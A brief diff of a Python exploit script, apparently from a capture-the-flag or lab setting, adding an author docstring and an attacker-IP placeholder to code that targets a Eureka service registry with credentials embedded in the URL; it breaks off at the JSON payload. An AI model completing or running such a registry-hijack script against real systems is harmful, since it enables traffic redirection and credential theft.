@@ -1,7 +1,12 @@
 import requests
 
+"""
+Exploit Author: z3rodol
+Exploit Date: August, 2025
+"""
+
 EUREKA_URL = "http://{EurekaSrvr}:{Eureka_PASSWORD}@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE"
-MY_IP = "xx.xx.xx.xx"
+MY_IP = "xx.xx.xx.xx" # Change here
 TARGET_PORT = 8081
 
 json_payload = {
